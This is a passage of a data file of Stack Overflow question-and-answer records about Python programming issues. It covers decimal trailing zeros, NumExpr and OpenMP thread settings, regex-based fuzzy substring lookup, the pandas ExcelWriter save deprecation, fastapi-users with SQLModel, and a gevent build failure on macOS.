    "AcceptedAnswer": "Raymond Hettinger has given a comprehensive explanation at cpython github:\nIn Arithmetic Operations, the section on Arithmetic operations rules tells us:\n\nTrailing zeros are not removed after operations.\n\nThere are test cases covering multiplication by zero. Here are some from multiply.decTest:\n-- zeros, etc.\nmulx021 multiply  0      0     ->  0\nmulx022 multiply  0     -0     -> -0\nmulx023 multiply -0      0     -> -0\nmulx024 multiply -0     -0     ->  0\nmulx025 multiply -0.0   -0.0   ->  0.00\nmulx026 multiply -0.0   -0.0   ->  0.00\nmulx027 multiply -0.0   -0.0   ->  0.00\nmulx028 multiply -0.0   -0.0   ->  0.00\nmulx030 multiply  5.00   1E-3  ->  0.00500\nmulx031 multiply  00.00  0.000 ->  0.00000\nmulx032 multiply  00.00  0E-3  ->  0.00000     -- rhs is 0\nmulx033 multiply  0E-3   00.00 ->  0.00000     -- lhs is 0\nmulx034 multiply -5.00   1E-3  -> -0.00500\nmulx035 multiply -00.00  0.000 -> -0.00000\nmulx036 multiply -00.00  0E-3  -> -0.00000     -- rhs is 0\nmulx037 multiply -0E-3   00.00 -> -0.00000     -- lhs is 0\nmulx038 multiply  5.00  -1E-3  -> -0.00500\nmulx039 multiply  00.00 -0.000 -> -0.00000\nmulx040 multiply  00.00 -0E-3  -> -0.00000     -- rhs is 0\nmulx041 multiply  0E-3  -00.00 -> -0.00000     -- lhs is 0\nmulx042 multiply -5.00  -1E-3  ->  0.00500\nmulx043 multiply -00.00 -0.000 ->  0.00000\nmulx044 multiply -00.00 -0E-3  ->  0.00000     -- rhs is 0\nmulx045 multiply -0E-3  -00.00 ->  0.00000     -- lhs is 0\n\nAnd this from the examples:\nmulx053 multiply 0.9 -0 -> -0.0\n\nIn the Summary of Arithmetic section, the motivation is explained at a high level:\n\nThe arithmetic was designed as a decimal extended floating-point arithmetic, directly implementing the rules that people are taught at\nschool. Up to a given working precision, exact unrounded results are\ngiven when possible (for instance, 0.9 \u00f7 10 gives 0.09, not\n0.089999996), and trailing zeros are correctly preserved in most operations (1.23 + 1.27 gives 2.50, not 2.5). Where results would\nexceed the working precision, floating-point rules apply.\n\nMore detail in given in the FAQ section Why are trailing fractional zeros important?.\n"
}
{
    "Id": 71248521,
    "PostTypeId": 1,
    "Title": "Why \" NumExpr defaulting to 8 threads. \" warning message shown in python?",
    "Body": "I am trying to use the lux library in python to get visualization recommendations. It shows warnings like NumExpr defaulting to 8 threads..\nimport pandas as pd\nimport numpy as np\nimport opendatasets as od\npip install lux-api\nimport lux\nimport matplotlib\n\nAnd then:\nlink = \"https://www.kaggle.com/noordeen/insurance-premium-prediction\"\nod.download(link) \ndf = pd.read_csv(\"./insurance-premium-prediction/insurance.csv\")\n\nBut, everything is working fine. Is there any problem or should I ignore it?\nWarning shows like this:\n\n",
    "AcceptedAnswerId": 74656206,
    "AcceptedAnswer": "This is not really something to worry about in most cases. The warning comes from this function, here the most important part:\n...\n    env_configured = False\n    n_cores = detect_number_of_cores()\n    if 'NUMEXPR_MAX_THREADS' in os.environ:\n        # The user has configured NumExpr in the expected way, so suppress logs.\n        env_configured = True\n        n_cores = MAX_THREADS\n...\n    if 'NUMEXPR_NUM_THREADS' in os.environ:\n        requested_threads = int(os.environ['NUMEXPR_NUM_THREADS'])\n    elif 'OMP_NUM_THREADS' in os.environ:\n        requested_threads = int(os.environ['OMP_NUM_THREADS'])\n    else:\n        requested_threads = n_cores\n        if not env_configured:\n            log.info('NumExpr defaulting to %d threads.'%n_cores)\n\nSo if neither NUMEXPR_MAX_THREADS nor NUMEXPR_NUM_THREADS nor OMP_NUM_THREADS are set, NumExpr uses so many threads as there are cores (even if the documentation says \"at most 8\", yet this is not what I see in the code).\nYou might want to use another number of threads, e.g. while really huge matrices are calculated and one could profit from it or to use less threads, because there is no improvement. Set the environment variables either in the shell or prior to importing numexpr, e.g.\nimport os\nos.environ['NUMEXPR_MAX_THREADS'] = '4'\nos.environ['NUMEXPR_NUM_THREADS'] = '2'\nimport numexpr as ne \n\n"
}
{
    "Id": 74717007,
    "PostTypeId": 1,
    "Title": "Why does a python function work in parallel even if it should not?",
    "Body": "I am running this code using the healpy package. I am not using multiprocessing and I need it to run on a single core. It worked for a certain amount of time, but, when I run it now, the function healpy.projector.GnomonicProj.projmap takes all the available cores.\nThis is the incriminated code block:\ndef Stacking () :\n\n    f = lambda x,y,z: pixelfunc.vec2pix(xsize,x,y,z,nest=False)\n    map_array = pixelfunc.ma_to_array(data)\n    im = np.zeros((xsize, xsize))\n    plt.figure()\n\n    for i in range (nvoids) :\n        sys.stdout.write(\"\\r\" + str(i+1) + \"/\" + str(nvoids))\n        sys.stdout.flush()\n        proj = hp.projector.GnomonicProj(rot=[rav[i],decv[i]], xsize=xsize, reso=2*nRad*rad_deg[i]*60/(xsize))\n        im += proj.projmap(map_array, f)\n\n    im/=nvoids\n    plt.imshow(im)\n    plt.colorbar()\n    plt.title(title + \" (Map)\")\n    plt.savefig(\"../Plots/stackedMap_\"+name+\".png\")\n\n    return im\n\nDoes someone know why this function is running in parallel? And most important, does someone know a way to run it in a single core?\nThank you!\n",
    "AcceptedAnswerId": 74717228,
    "AcceptedAnswer": "In this thread they recommend to set the environment variable OMP_NUM_THREADS accordingly:\n\nWorked with:\nimport os\nos.environ['OMP_NUM_THREADS'] = '1'\nimport healpy as hp\nimport numpy as np\n\nos.environ['OMP_NUM_THREADS'] = '1' have to be done before import numpy and healpy libraries.\n\nAs to the why: probably they use some parallelization techniques wrapped within their implementation of the functions you use. According to the name of the variable, I would guess OpenMP it is.\n"
}
{
    "Id": 74717893,
    "PostTypeId": 1,
    "Title": "How to efficiently search for similar substring in a large text python?",
    "Body": "Let me try to explain my issue with an example, I have a large corpus and a substring like below,\ncorpus = \"\"\"very quick service, polite workers(cory, i think that's his name), i basically just drove there and got a quote(which seems to be very fair priced), then dropped off my car 4 days later(because they were fully booked until then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now.\"\"\"\n\nsubstring = \"\"\"until then then i dropped off my car on my appointment day then the same day the shop called me and notified me that the the job is done i can go pickup my car when i go checked out my car i was amazed by the job they ve done to it and they even gave that dirty car a wash prob even waxed it or coated it cuz it was shiny as hell tires shine mats were vacuumed too i gave them a dirty broken car they gave me back a what seems like a brand new car i m happy with the result and i will def have all my car s work done by this place from now\"\"\"\n\nBoth the substring and corpus are very similar but it not exact,\nIf I do something like,\nimport re\nre.search(substring, corpus, flags=re.I) # this will fail substring is not exact but rather very similar\n\nIn the corpus the substring is like below which is bit different from the substring I have because of that regular expression search is failing, can someone suggest a really good alternative for similar substring lookup,\nuntil then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now\n\nI did try difflib library but it was not satisfying my use-case.\nSome background information,\nThe substring I have right now, is obtained some time ago from pre-processed corpus using this regex re.sub(\"[^a-zA-Z]\", \" \", corpus).\nBut now I need to use that substring I have to do the reverse lookup in the corpus text and find the start and ending index in the corpus.\n",
    "AcceptedAnswerId": 74719826,
    "AcceptedAnswer": "You don't actually need to fuzzy match all that much, at least for the example given; text can only change in spaces within substring, and it can only change by adding at least one non-alphabetic character (which can replace a space, but the space can't be deleted without a replacement). This means you can construct a regex directly  from substring with wildcards between words, search (or finditer) the corpus for it, and the resulting match object will tell you where the match(es) begin and end:\nimport re\n\n# Allow any character between whitespace-separated \"words\" except ASCII\n# alphabetic characters\nssre = re.compile(r'[^a-z]+'.join(substring.split()), re.IGNORECASE)\n\nif m := ssre.search(corpus):\n    print(m.start(), m.end())\n\n    print(repr(m.group(0)))\n\nTry it online!\nwhich correctly identifies where the match began (index 217) and ended (index 771) in corpus; .group(0) can directly extract the matching text for you if you prefer (it's uncommon to need the indices, so there's a decent chance you were asking for them solely to extract the real text, and .group(0) does that directly). The output is:\n217 771\n\"until then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now\"\n\nIf spaces might be deleted without being replaced, just change the + quantifier to * (the regex will run a little slower since it can't short-circuit as easily, but would still work, and should run fast enough).\nIf you need to handle non-ASCII alphabetic characters, the regex joiner can change from r'[^a-z]+' to the equivalent r'[\\W\\d_]+' (which means \"match all non-word characters [non-alphanumeric and not underscore], plus numeric characters and underscores\"); it's a little more awkward to read, but it handles stuff like \u00e9 properly (treating it as part of a word, not a connector character).\nWhile it's not going to be as flexible as difflib, when you know no words are removed or added, it's just a matter of spacing and punctuation, this works perfectly, and should run significantly faster than a true fuzzy matching solution (that has to do far more work to handle the concept of close matches).\n"
}
{
    "Id": 74948525,
    "PostTypeId": 1,
    "Title": "FutureWarning: save is not part of the public API in Python",
    "Body": "I am using Python to convert Pandas df to .xlsx (in Plotly-Dash app.). All working well so far but with this warning tho:\n\"FutureWarning:\nsave is not part of the public API, usage can give unexpected results and will be removed in a future version\"\nHow should I modify the code below in order to keep its functionality and stability in future? Thanks!\n writer = pd.ExcelWriter(\"File.xlsx\", engine = \"xlsxwriter\")\n\n workbook  = writer.book\n\n df.to_excel(writer, sheet_name = 'Sheet', index = False)\n  \n writer.save()\n\n",
    "AcceptedAnswerId": 74948596,
    "AcceptedAnswer": "just replace save with close.\n writer = pd.ExcelWriter(\"File.xlsx\", engine = \"xlsxwriter\")\n\n workbook  = writer.book\n\n df.to_excel(writer, sheet_name = 'Sheet', index = False)\n  \n writer.close()\n\n"
}
{
    "Id": 70694787,
    "PostTypeId": 1,
    "Title": "fastapi fastapi-users with Database adapter for SQLModel users table is not created",
    "Body": "I was trying to use fastapi users package to quickly Add a registration and authentication system to my FastAPI project which uses the PostgreSQL database. I am using asyncio to be able to create asynchronous functions.\nIn the beginning, I used only sqlAlchemy and I have tried their example here. And I added those line of codes to my app/app.py to create the database at the starting of the server. and everything worked like a charm. the table users was created on my database.\n@app.on_event(\"startup\")\nasync def on_startup():\n    await create_db_and_tables()\n\nSince I am using SQLModel I added FastAPI Users - Database adapter for SQLModel to my virtual en packages. And I added those lines to fastapi_users/db/__init__.py to be able to use the SQL model database.\ntry:\n    from fastapi_users_db_sqlmodel import (  # noqa: F401\n        SQLModelBaseOAuthAccount,\n        SQLModelBaseUserDB,\n        SQLModelUserDatabase,\n    )\nexcept ImportError:  # pragma: no cover\n    pass\n\nI have also modified app/users.py, to use SQLModelUserDatabase instead of sqlAchemy one.\nasync def get_user_manager(user_db: SQLModelUserDatabase = Depends(get_user_db)):\n    yield UserManager(user_db)\n\nand the app/dp.py to use SQLModelUserDatabase, SQLModelBaseUserDB, here is the full code of app/db.py\nimport os\nfrom typing import AsyncGenerator\n\nfrom fastapi import Depends\nfrom sqlalchemy.ext.asyncio import AsyncSession, create_async_engine\nfrom sqlalchemy.orm import sessionmaker\n\nfrom fastapi_users.db import SQLModelUserDatabase, SQLModelBaseUserDB\nfrom sqlmodel import SQLModel\n\n\nfrom app.models import UserDB\n\nDATABASE_URL = os.environ.get(\"DATABASE_URL\")\n\n\nengine = create_async_engine(DATABASE_URL)\n\nasync_session_maker = sessionmaker(\n    engine, class_=AsyncSession, expire_on_commit=False)\n\n\nasync def create_db_and_tables():\n    async with engine.begin() as conn:\n        await conn.run_sync(SQLModel.metadata.create_all)\n\n\nasync def get_async_session() -> AsyncSession:\n    async_session = sessionmaker(\n        engine, class_=AsyncSession, expire_on_commit=False\n    )\n    async with async_session() as session:\n        yield session\n\n\nasync def get_user_db(session: AsyncSession = Depends(get_async_session)):\n    yield SQLModelUserDatabase(UserDB, session, SQLModelBaseUserDB)\n\n\nOnce I run the code, the table is not created at all. I wonder what could be the issue. I could not understand. Any idea?\n",
    "AcceptedAnswerId": 75063693,
    "AcceptedAnswer": "By the time I posted this question that was the answer I received from one of the maintainer of fastapi-users that made me switch to sqlAlchemy that time, actually I do not know if they officially released sqlModel DB adapter or not\n\nMy guess is that you didn't change the UserDB model so that it inherits from the SQLModelBaseUserDB one. It's necessary in order to let SQLModel detect all your models and create them.\n\n\nYou can have an idea of what it should look like in fastapi-users-db-sqlmodel tests: https://github.com/fastapi-users/fastapi-users-db-sqlmodel/blob/3a46b80399f129aa07a834a1b40bf49d08c37be1/tests/conftest.py#L25-L27\n\n\n\nBear in mind though that we didn't officially release this DB adapter; as they are some problems with SQLModel regarding UUID (tiangolo/sqlmodel#25). So you'll probably run into issues.\n\n\nand here is the GitHub link of the issue: https://github.com/fastapi-users/fastapi-users/discussions/861\n"
}
{
    "Id": 73894238,
    "PostTypeId": 1,
    "Title": "gevent 21.12.0 installation failing in mac os monterey",
    "Body": "I am trying to install gevent 21.12.0 on Mac OS Monterey (version 12.6) with python 3.9.6 and pip 21.3.1. But it is failing with the below error. Any suggestion?\n(venv) debrajmanna@debrajmanna-DX6QR261G3 qa % pip install gevent\nCollecting gevent\n  Using cached gevent-21.12.0.tar.gz (6.2 MB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... done\n  Preparing metadata (pyproject.toml) ... done\nCollecting greenlet=1.1.0\n  Using cached greenlet-1.1.3-cp39-cp39-macosx_10_9_universal2.whl\nCollecting zope.event\n  Using cached zope.event-4.5.0-py2.py3-none-any.whl (6.8 kB)\nCollecting zope.interface\n  Using cached zope.interface-5.4.0-cp39-cp39-macosx_10_9_universal2.whl\nRequirement already satisfied: setuptools in /Users/debrajmanna/code/python/github/spotnana/venv/lib/python3.9/site-packages (from gevent) (60.2.0)\nBuilding wheels for collected packages: gevent\n  Building wheel for gevent (pyproject.toml) ... error\n  ERROR: Command errored out with exit status 1:\n   command: /Users/debrajmanna/code/python/github/spotnana/venv/bin/python /Users/debrajmanna/code/python/github/spotnana/venv/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/tmpi2i_lqc2\n       cwd: /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370\n  Complete output (46 lines):\n  running bdist_wheel\n  running build\n  running build_py\n  running build_ext\n  generating cffi module 'build/temp.macosx-10.9-universal2-cpython-39/gevent.libuv._corecffi.c'\n  Running '(cd  \"/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/libev\"  && sh ./configure -C > configure-output.txt )' in /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370\n  generating cffi module 'build/temp.macosx-10.9-universal2-cpython-39/gevent.libev._corecffi.c'\n  Not configuring libev, 'config.h' already exists\n  Not configuring libev, 'config.h' already exists\n  building 'gevent.libev.corecext' extension\n  Embedding c-ares .build_ext_make_mod object at 0x104f40bb0> \n  Inserted  build/temp.macosx-10.9-universal2-cpython-39/c-ares/include in include dirs ['build/temp.macosx-10.9-universal2-cpython-39/c-ares/include', '/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/include/python3.9', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares/include', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares/src/lib', 'src/gevent', 'src/gevent/libev', 'src/gevent/resolver', '.']\n  Running '(cd  \"/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares\"  && if [ -r include/ares_build.h ]; then cp include/ares_build.h include/ares_build.h.orig; fi   && sh ./configure --disable-dependency-tracking -C CFLAGS=\"-Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -iwithsysroot/System/Library/Frameworks/System.framework/PrivateHeaders -iwithsysroot/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Headers -arch arm64 -arch x86_64 -Werror=implicit-function-declaration\"  && cp src/lib/ares_config.h include/ares_build.h \"$OLDPWD\"   && cat include/ares_build.h   && if [ -r include/ares_build.h.orig ]; then mv include/ares_build.h.orig include/ares_build.h; fi) > configure-output.txt' in /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/build/temp.macosx-10.9-universal2-cpython-39/c-ares/include\n  configure: WARNING: Continuing even with errors mentioned immediately above this line.\n  rm: conftest.dSYM: is a directory\n  rm: conftest.dSYM: is a directory\n  configure: WARNING: Continuing even with errors mentioned immediately above this line.\n  building 'gevent.resolver.cares' extension\n  building 'gevent._gevent_c_greenlet_primitives' extension\n  building 'gevent._gevent_c_hub_primitives' extension\n  building 'gevent._gevent_c_hub_local' extension\n  building 'gevent._gevent_c_waiter' extension\n  building 'gevent._gevent_cgreenlet' extension\n  building 'gevent._gevent_c_tracer' extension\n  building 'gevent._gevent_c_abstract_linkable' extension\n  building 'gevent._gevent_c_semaphore' extension\n  building 'gevent._gevent_clocal' extension\n  building 'gevent._gevent_c_ident' extension\n  building 'gevent._gevent_c_imap' extension\n  building 'gevent._gevent_cevent' extension\n  building 'gevent._gevent_cqueue' extension\n  src/gevent/queue.c:7071:12: warning: unused function '__pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__' [-Wunused-function]\n  static int __pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__(PyObject *__pyx_v_self) {\n             ^\n  1 warning generated.\n  src/gevent/queue.c:7071:12: warning: unused function '__pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__' [-Wunused-function]\n  static int __pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__(PyObject *__pyx_v_self) {\n             ^\n  1 warning generated.\n  building 'gevent.libev._corecffi' extension\n  building 'gevent.libuv._corecffi' extension\n  build/temp.macosx-10.9-universal2-cpython-39/gevent.libuv._corecffi.c:50:14: fatal error: 'pyconfig.h' file not found\n  #    include \n               ^~~~~~~~~~~~\n  1 error generated.\n  error: command '/usr/bin/clang' failed with exit code 1\n  ----------------------------------------\n  ERROR: Failed building wheel for gevent\nFailed to build gevent\nERROR: Could not build wheels for gevent, which is required to install pyproject.toml-based projects\n\n",
    "AcceptedAnswerId": 75240247,
    "AcceptedAnswer": "Looked all over trying to figure out a solution to this problem until I finally stumbled on this post.\nI think the issue is specific to the virtual environment. I had the project open with it's own venv in PyCharm, and it seems that the python distribution headers were not findable.\nTo reiterate the solution linked:\n\nFind where the Python.h file is defined. I was able to find it using find /usr/local -name Python.h\nCopy the path to the directory Python.h is defined in\nSet the C_INCLUDE_PATH environment variable accordingly, for me: export C_INCLUDE_PATH=\"/usr/local/munki/Python.framework/Versions/3.9/include/python3.9\"\n\nAfter this, I was able to run pip3 install gevent with no issues.\n"
}
